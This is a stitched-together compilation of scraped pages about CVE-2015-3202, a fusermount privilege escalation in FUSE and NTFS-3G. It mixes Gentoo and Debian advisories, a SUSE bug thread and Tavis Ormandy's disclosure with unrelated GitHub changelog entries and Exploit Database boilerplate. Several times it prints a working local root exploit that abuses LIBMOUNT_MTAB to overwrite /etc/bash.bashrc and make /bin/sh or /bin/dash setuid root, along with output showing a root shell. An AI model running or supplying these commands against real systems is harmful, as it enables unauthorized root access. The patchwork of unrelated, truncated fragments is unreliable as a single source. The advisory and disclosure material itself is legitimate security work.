# NTFS-3G: Privilege escalation — GLSA **201701-19**

A vulnerability in NTFS-3G allows local users to gain root
privileges.

### Affected packages

| Package | **sys-fs/ntfs3g** on all architectures |
| --- | --- |
| Affected versions | < **2016.2.22** |
| Unaffected versions | >= **2016.2.22** |

### Background

NTFS-3G is a stable, full-featured, read-write NTFS driver for various
operating systems.

### Description

NTFS-3G is affected by the same vulnerability as reported in “GLSA
201603-04” when the bundled fuse-lite implementation is used.

### Impact

A local user could gain root privileges.

### Workaround

There is no known workaround at this time. However, on Gentoo when the
“external-fuse” USE flag is set or the “suid” USE flag is not set
then NTFS-3G is not affected. Both of these cases are the default
configuration.

### Resolution

All NTFS-3G users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-fs/ntfs3g-2016.2.22"

```

# FUSE: incorrect filtering of environment variables leading to privilege escalation — GLSA **201603-04**

The fusermount binary in FUSE does not properly clear the
environment before invoking mount or umount as root that allows a local
user to overwrite arbitrary files.

### Affected packages

| Package | **sys-fs/fuse** on all architectures |
| --- | --- |
| Affected versions | < **2.9.4** |
| Unaffected versions | >= **2.9.4** |

### Background

FUSE provides an interface for filesystems implemented in userspace.

### Description

The fusermount binary calls setuid(geteuid()) to reset the RUID when it
invokes /bin/mount so that it can use privileged mount options that are
normally restricted if RUID != EUID. FUSE does not properly clear
environment variables before invoking mount or umount as root allowing
this to be passed to operations using elevated privileges such as
LIBMOUNT\_MTAB that is used by the mount commands debugging feature.

### Impact

The FUSE vulnerability allows a local, unprivileged user to overwrite
arbitrary files on the system.

### Workaround

There is no known work around at this time.

### Resolution

All FUSE users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-fs/fuse-2.9.4"

```

Given that SLE11 does not use libmount anyways, thats a minor issue for SLE11 anyways. Yet, nevertheless using the existing fuse submits for sle10 and sle11. ``` [Comment 13](show_bug.cgi?id=931452#c13)  Marcus Meissner   2015-05-22 11:07:58 UTC  ``` From: Tavis Ormandy <taviso@google.com> Date: Thu, 21 May 2015 09:55:16 -0700 Subject: [oss-security] CVE-2015-3202 fuse privilege escalation  Hello, this was discussed on the distros list last week.  The fusermount binary calls setuid(geteuid()) to reset the ruid when it invokes /bin/mount so that it can use privileged mount options that are normally restricted if ruid != euid. That's acceptable (but scary) in theory, because fusermount can sanitize the call to make sure it's safe.  <http://sources.debian.net/src/fuse/2.9.3-15/util/mount_util.c/?hl=99#L99>  However, because mount thinks it's being invoked by root, it allows access to debugging features via the environment that would not normally be safe for unprivileged users and fusermount doesn't sanitize them.  Therefore, the bug is that the environment is not cleared when calling mount with ruid=0. One debugging feature available is changing the location of /etc/mtab by setting LIBMOUNT_MTAB, which can be abused to overwrite arbitrary files.  This can be exploited like so.  $ printf "chmod 4755 /bin/dash" > /tmp/exploit && chmod 755 /tmp/exploit $ mkdir -p '/tmp/exploit||/tmp/exploit' $ LIBMOUNT_MTAB=/etc/bash.bashrc  _FUSE_COMMFD=0 fusermount '/tmp/exploit||/tmp/exploit' fusermount: failed to open /etc/fuse.conf: Permission denied sending file descriptor: Socket operation on non-socket $ cat /etc/bash.bashrc /dev/fuse /tmp/exploit||/tmp/exploit fuse rw,nosuid,nodev,user=taviso 0 0  Then simply wait for root to login, or alternatively overwrite /etc/default/locale and wait for cron to run a script that sources it. That means root wouldn't have to log in, but you would have to wait around until midnight to check if it worked.  Tavis.  P.S. Just for fun, I also came up with a version that fits in a tweet <https://twitter.com/taviso/status/601370527437967360> ``` [Comment 16](show_bug.cgi?id=931452#c16)  Bernhard Wiedemann   2015-05-22 12:00:13 UTC  ``` This is an autogenerated message for OBS integration: This bug (931452) was mentioned in <https://build.opensuse.org/request/show/308362> 13.2 / fuse <https://build.opensuse.org/request/show/308363> 13.1 / fuse ``` [Comment 17](show_bug.cgi?id=931452#c17)  Forgotten User sLJ7K2dvxj   2015-05-26 11:48:20 UTC  ``` Over to security-team. ``` [Comment 18](show_bug.cgi?id=931452#c18)  Swamp Workflow Management   2015-06-03 15:07:47 UTC  ``` openSUSE-SU-2015:0997-1: An update that fixes one vulnerability is now available.

# Warning about bidirectional Unicode text

* [code](https://github.blog/changelog/label/code/)
* [repos](https://github.blog/changelog/label/repos/)
* [security-and-compliance](https://github.blog/changelog/label/security-and-compliance/)

October 31, 2021

A warning is now displayed when a file's contents include bidirectional Unicode text. Such text can be interpreted or compiled differently than it appears in a user interface. For example, hidden, bidirectional Unicode characters can be used to swap segments of text in a file. This can cause code to appear one way and be interpreted or compiled another way.

![image](https://i0.wp.com/user-images.githubusercontent.com/1767415/139425260-6d62b200-d486-486e-94bf-e27a26523844.png?ssl=1)

This security issue is the topic of the Common Vulnerabilities and Exposures (CVE) publication: [CVE-2021-42574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574). **If your use of bidirectional Unicode characters is intentional and not malformed, you can ignore the warning.**

To review a file for which this warning is displayed, open it in an editor that will display the hidden, bidirectional Unicode characters, like [Visual Studio Code](https://code.visualstudio.com/) which highlights the characters by default. Then, verify that the characters are necessary and not disguising text that will be interpreted or compiled differently than it appears.

## [Pull Request Merge Queue Limited Beta](https://github.blog/changelog/2021-10-27-pull-request-merge-queue-limited-beta)

October 27, 2021

* [merge-queue](https://github.blog/changelog/label/merge-queue/)
* [pull-requests](https://github.blog/changelog/label/pull-requests/)

Pull Request Merge Queue is now available in limited beta. Learn more about the feature and how to request early access.

### Why a merge queue?

Maintaining high velocity and keeping your main branch green can be a challenge today. Many repositories try to do this by requiring all pull requests be up to date with the main branch before merging. This ensures the main branch is never updated to a commit that has not passed all required status checks, but forces developers to update (or rebase) their pull request branches multiple times and then wait for status checks to complete before trying to merge again. On some projects, status checks can take 30 or more minutes and if another pull request gets merged during this time, the process starts over (for everyone). This can have a significant impact on the overall velocity of the team and make it harder for developers to move onto their next task.

Merge Queue provides the benefits of requiring pull request branches to be up to date before merging, but without requiring developers to go through this process.

### How it works

Merge Queue works by validating different combinations of pull requests identified as “ready to merge” in parallel so that pull requests can merge efficiently and without the typical delays that exist between merges today.

![GIF of merge queue demo](https://github.blog/wp-content/uploads/2021/10/GitHub-merge-queue-demo.gif)

Once a pull request has been approved and has passed all required status checks, a user with write access in the repository can queue the pull request to be merged. The pull request branch does not need to be up to date with the base branch before being queued. The merge queue then creates a temporary branch that includes the pull request and any non-failing pull requests ahead of it in the queue. This branch is based on the latest version of the base branch and is what the history of the base branch will look like if it passes all required status checks. Assuming it does pass these checks, the base branch is fast-forwarded and the pull request is marked as merged.

### Early access

Merge Queue is currently available in limited beta. This gives us the opportunity to better understand your requirements as we improve the quality and capability of the feature. In the first phase of this beta, access to the feature is limited to a select number of organizations that meet certain requirements like having a consistently high volume of changes from multiple users being merged each day.

Organization admins can request early access for their organization by joining the waitlist: <https://github.com/features/merge-queue/signup>. You will need to provide the name of a repository in this organization that you plan on using merge queue on, but you will have the opportunity to test the feature on other repositories during the beta. We will contact you prior to onboarding to work through the details.

Early access will expand to more organizations over the coming months.

### Learn more

For the latest updates on this feature, see the [public roadmap issue](https://github.com/github/roadmap/issues/272) and [`#merge-queue` posts](https://github.blog/changelog/label/merge-queue/) in the GitHub Changelog.

## [New Codespaces features launching at Universe 2021](https://github.blog/changelog/2021-10-27-new-codespaces-features-launching-at-universe-2021)

October 27, 2021

* [api](https://github.blog/changelog/label/api/)
* [cli](https://github.blog/changelog/label/cli/)
* [codespaces](https://github.blog/changelog/label/codespaces/)
* [Universe](https://github.blog/changelog/label/universe/)

GitHub Codespaces allows teams and organizations to spin-up developer environments directly from a browser or through Visual Studio Code, without the hassle of setting up a brand new environment tailored to a specific repository.

We've been hard at work since our [general availability announcement in August](https://github.blog/changelog/2021-08-11-codespaces-is-generally-available-for-team-and-enterprise/) making Codespaces the best way for you to develop software, which is why we're so happy to announce several new features at GitHub Universe 2021.

We know that many developers use the `gh` CLI to speed up or fully automate daily tasks, and we've received dozens of requests to add Codespaces support to the CLI. As of today, the `gh codespace` (or `gh cs` for those saving keystrokes) command now allows developers to manage their codespaces from the GitHub CLI. In addition to codespace creation, listing, and starting/stopping, users can forward ports, set port visibility, SSH into their codespaces, and copy files to/from their codespaces.

```
# Create a new codespace via the CLI
gh codespace create --repo monalisa/octocat --branch main
```

We're especially excited about `ssh` access, as it allows developers who prefer to use editors like `vim` and `emacs` to more easily develop in Codespaces. Just `gh cs ssh` into your codespace and launch your editor of choice; we'll set up the environment and grab all your dotfiles so you're ready to develop in seconds.

```
# SSH into the codespace created above
gh codespace ssh -c monalisa-monalisa-octocat-1337h4x0r
```

Complimenting the CLI, we are also launching an API in beta. The API provides control plane operations around a user's codespaces including creating, starting/stopping, listing available machine types, and setting user secrets. These APIs will allow developers to build Codespaces integrations into their favorite editors and tools, as well as allow for additional automation around Codespaces.

```
# Stop a running codespace via the API
curl https://api.github.com/user/codespaces/monalisa-monalisa-octocat-1337h4x0r/stop \
  -H "Authorization: token <Personal Access Token>" \
  -X POST
```

We also know that security and privacy are critical, and we've gotten a lot of feedback on providing additional visibility options for forwarded ports beyond `public` and `private`. Today we're launching a third option: `org` visible ports, which are accessible to any user in the organization the codespace has been created in. This is great for securely collaborating with your teammates on new and exciting features in your codespaces.

```
# Make port 80 visible to all users in an org
gh codespace ports visibility 80:org -c monalisa-monalisa-octocat-1337h4x0r
```

Continuing with security improvements, we have also heard from developers having difficulty launching codespaces from devcontainers stored in private container registries. To make this easier, we are offering streamlined access to containers stored in the GitHub Container Registry; you no longer have to provide a Personal Access Token (PAT).

Speaking of devcontainers, we know that there's a wide gap between using a predefined devcontainer and building a custom devcontainer. To help make that transition a little easier, we're launching the ability to extend devcontainers with `features`, which include shells, package managers, programming languages, and other common tools. For example, adding Terraform to a supported base image is as easy as adding the following to your `devcontainer.json`.

```
"features": {
  "terraform": "latest"
}
```

If you have any feedback about these features, or Codespaces in general, we'd [love to hear from you](https://github.com/github/feedback/discussions/categories/codespaces-feedback)!

Debian Security Advisory DSA-3268-1                   security@debian.org
<http://www.debian.org/security/>                      Salvatore Bonaccorso

Package        : ntfs-3g
CVE ID         : CVE-2015-3202
Debian Bug     : 786475

Tavis Ormandy discovered that NTFS-3G, a read-write NTFS driver for
FUSE, does not scrub the environment before executing mount or umount
with elevated privileges. A local user can take advantage of this flaw
to overwrite arbitrary files and gain elevated privileges by accessing
debugging features via the environment that would not normally be safe
for unprivileged users.

For the oldstable distribution (wheezy), this problem has been fixed in
version 1:2012.1.15AR.5-2.1+deb7u1. Note that this issue does not affect
the binary packages distributed in Debian in wheezy as ntfs-3g does not
use the embedded fuse-lite library.

For the stable distribution (jessie), this problem has been fixed in
version 1:2014.2.15AR.2-1+deb8u1.

For the testing distribution (stretch) and the unstable distribution
(sid), this problem will be fixed soon.

We recommend that you upgrade your ntfs-3g packages.

these updates to your system and frequently asked questions can be

|  | # Therefore, the bug is that the environment is not cleared when calling mount |
|  | # with ruid=0. One debugging feature available is changing the location of |
|  | # /etc/mtab by setting LIBMOUNT\_MTAB, which we can abuse to overwrite arbitrary |
|  | # files. |
|  | # |
|  | # In this case, I'm trying to overwrite /etc/bash.bashrc (using the name of the |
|  | # current shell from $0...so it only works if you're using bash!). |
|  | # |
|  | # The line written by fusermount will look like this: |
|  | # |
|  | # /dev/fuse /tmp/.123;/tmp/.123 fuse xxx,xxx,xxx,xxx |
|  | # |
|  | # Which will try to execute /dev/fuse with the paramter /tmp/\_, fail because |
|  | # /dev/fuse is a device node, and then execute /tmp/\_ with the parameters fuse |
|  | # xxx,xxx,xxx,xxx. This means executing /bin/sh will give you a root shell the |
|  | # next time root logs in. |
|  | # |
|  | # Another way to exploit it would be overwriting /etc/default/locale, then |
|  | # waiting for cron to run /etc/cron.daily/apt at midnight. That means root |
|  | # wouldn't have to log in, but you would have to wait around until midnight to |
|  | # check if it worked. |
|  | # |
|  | # And we have enough characters left for a hash tag/comment. |
|  | LIBMOUNT\_MTAB=/etc/$0.$0rc \_FUSE\_COMMFD=0 fusermount $a #CVE-2015-3202 |
|  |  |
|  | # Here is how the exploit looks when you run it: |
|  | # |
|  | # $ a=/tmp/\_;b=chmod\ u+sx;echo $b /bin/sh>$a;$b $a;a+=\;$a;mkdir -p $a;LIBMOUNT\_MTAB=/etc/$0.$0rc \_FUSE\_COMMFD=0 fusermount $a #CVE-2015-3202 |
|  | # fusermount: failed to open /etc/fuse.conf: Permission denied |
|  | # sending file descriptor: Socket operation on non-socket |
|  | # $ cat /etc/bash.bashrc |
|  | # /dev/fuse /tmp/\_;/tmp/\_ fuse rw,nosuid,nodev,user=taviso 0 0 |
|  | # |
|  | # Now when root logs in next... |
|  | # $ sudo -s |
|  | # bash: /dev/fuse: Permission denied |
|  | # # ls -Ll /bin/sh |
|  | # -rwsr-xr-x 1 root root 121272 Feb 19 2014 /bin/sh |
|  | # # exit |
|  | # $ sh -c 'id' |
|  | # euid=0(root) groups=0(root) |
|  | # |
|  | # To repair the damage after testing, do this: |
|  | # |
|  | # $ sudo rm /etc/bash.bashrc |
|  | # $ sudo apt-get install -o Dpkg::Options::="--force-confmiss" --reinstall -m bash |
|  | # $ sudo chmod 0755 /bin/sh |
|  | # $ sudo umount /tmp/.$$\;/tmp/.$$ |
|  | # $ rm -rf /tmp/.$$ /tmp/.$$\; |

### Upstream information

[CVE-2015-3202 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3202)

#### Description

fusermount in FUSE before 2.9.3-15 does not properly clear the environment before invoking (1) mount or (2) umount as root, which allows local users to write to arbitrary files via a crafted LIBMOUNT\_MTAB environment variable that is used by mount's debugging feature.

Package        : fuse
CVE ID         : CVE-2015-3202

Tavis Ormandy discovered that FUSE, a Filesystem in USErspace, does not
scrub the environment before executing mount or umount with elevated
privileges. A local user can take advantage of this flaw to overwrite
arbitrary files and gain elevated privileges by accessing debugging
features via the environment that would not normally be safe for
unprivileged users.

For the oldstable distribution (wheezy), this problem has been fixed
in version 2.9.0-2+deb7u2.

For the stable distribution (jessie), this problem has been fixed in
version 2.9.3-15+deb8u1.

For the testing distribution (stretch) and the unstable distribution
(sid), this problem will be fixed soon.

We recommend that you upgrade your fuse packages.

these updates to your system and frequently asked questions can be

Subject: CVE-2015-3202 fuse privilege escalation

Hello, this was discussed on the distros list last week.

The fusermount binary calls setuid(geteuid()) to reset the ruid when
it invokes /bin/mount so that it can use privileged mount options that
are normally restricted if ruid != euid. That's acceptable (but scary)
in theory, because fusermount can sanitize the call to make sure it's
safe.

<http://sources.debian.net/src/fuse/2.9.3-15/util/mount_util.c/?hl=99#L99>

However, because mount thinks it's being invoked by root, it allows
access to debugging features via the environment that would not
normally be safe for unprivileged users and fusermount doesn't
sanitize them.

Therefore, the bug is that the environment is not cleared when calling
mount with ruid=0. One debugging feature available is changing the
location of /etc/mtab by setting LIBMOUNT_MTAB, which can be abused to
overwrite arbitrary files.

This can be exploited like so.

$ printf "chmod 4755 /bin/dash" > /tmp/exploit && chmod 755 /tmp/exploit
$ mkdir -p '/tmp/exploit||/tmp/exploit'
$ LIBMOUNT_MTAB=/etc/bash.bashrc  _FUSE_COMMFD=0 fusermount
'/tmp/exploit||/tmp/exploit'
fusermount: failed to open /etc/fuse.conf: Permission denied
sending file descriptor: Socket operation on non-socket
$ cat /etc/bash.bashrc
/dev/fuse /tmp/exploit||/tmp/exploit fuse rw,nosuid,nodev,user=taviso 0 0

Then simply wait for root to login, or alternatively overwrite
/etc/default/locale and wait for cron to run a script that sources it.
That means root wouldn't have to log in, but you would have to wait
around until midnight to check if it worked.

Tavis.

P.S. Just for fun, I also came up with a version that fits in a tweet
<https://twitter.com/taviso/status/601370527437967360>

# Making a demo exploit for CVE-2015-3202 on Ubuntu fit in a tweet.

# Here's how it works, $a holds the name of a shellscript to be executed as
# root.
a=/tmp/.$$;

# $b is used twice, first to build the contents of shellscript $a, and then as
# a command to make $a executable. Quotes are unused to save a character, so
# the seperator must be escaped.
b=chmod\ u+sx;

# Build the shellscript $a, which should contain "chmod u+sx /bin/sh", making
# /bin/sh setuid root. This only works on Debian/Ubuntu because they use dash,
# and dont make it drop privileges.
#
# http://www.openwall.com/lists/oss-security/2013/08/22/12
#
echo $b /bin/sh>$a;

# Now make the $a script executable using the command in $b. This needlessly
# sets the setuid bit, but that doesn't do any harm.
$b $a;

# Now make $a the directory we want fusermount to use. This directory name is
# written to an arbitrary file as part of the vulnerability, so needs to be
# formed such that it's a valid shell command.
a+=\;$a;

# Create the mount point for fusermount.
mkdir -p $a;

# fusermount calls setuid(geteuid()) to reset the ruid when it invokes
# /bin/mount so that it can use privileged mount options that are normally

#
# Therefore, the bug is that the environment is not cleared when calling mount
# with ruid=0. One debugging feature available is changing the location of
# /etc/mtab by setting LIBMOUNT_MTAB, which we can abuse to overwrite arbitrary
# files.
#
# In this case, I'm trying to overwrite /etc/bash.bashrc (using the name of the
# current shell from $0...so it only works if you're using bash!).
#
# The line written by fusermount will look like this:
#
# /dev/fuse /tmp/.123;/tmp/.123 fuse xxx,xxx,xxx,xxx
#
# Which will try to execute /dev/fuse with the paramter /tmp/_, fail because
# /dev/fuse is a device node, and then execute /tmp/_ with the parameters fuse
# xxx,xxx,xxx,xxx. This means executing /bin/sh will give you a root shell the
# next time root logs in.
#
# Another way to exploit it would be overwriting /etc/default/locale, then
# waiting for cron to run /etc/cron.daily/apt at midnight. That means root
# wouldn't have to log in, but you would have to wait around until midnight to
# check if it worked.
#
# And we have enough characters left for a hash tag/comment.
LIBMOUNT_MTAB=/etc/$0.$0rc _FUSE_COMMFD=0 fusermount $a #CVE-2015-3202

# Here is how the exploit looks when you run it:
#
# $ a=/tmp/_;b=chmod\ u+sx;echo $b /bin/sh>$a;$b $a;a+=\;$a;mkdir -p $a;LIBMOUNT_MTAB=/etc/$0.$0rc _FUSE_COMMFD=0 fusermount $a #CVE-2015-3202
# fusermount: failed to open /etc/fuse.conf: Permission denied
# sending file descriptor: Socket operation on non-socket
# $ cat /etc/bash.bashrc
# /dev/fuse /tmp/_;/tmp/_ fuse rw,nosuid,nodev,user=taviso 0 0
#
# Now when root logs in next...
# $ sudo -s
# bash: /dev/fuse: Permission denied
# # ls -Ll /bin/sh
# -rwsr-xr-x 1 root root 121272 Feb 19  2014 /bin/sh
# # exit
# $ sh -c 'id'
# euid=0(root) groups=0(root)
#
# To repair the damage after testing, do this:
#
# $ sudo rm /etc/bash.bashrc
# $ sudo apt-get install -o Dpkg::Options::="--force-confmiss" --reinstall -m bash
# $ sudo chmod 0755 /bin/sh
# $ sudo umount /tmp/.$$\;/tmp/.$$
# $ rm -rf /tmp/.$$ /tmp/.$$\;
#

$ printf "chmod 4755 /bin/dash" > /tmp/exploit && chmod 755 /tmp/exploit
$ mkdir -p '/tmp/exploit||/tmp/exploit'
$ LIBMOUNT_MTAB=/etc/bash.bashrc  _FUSE_COMMFD=0 fusermount '/tmp/exploit||/tmp/exploit'

lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
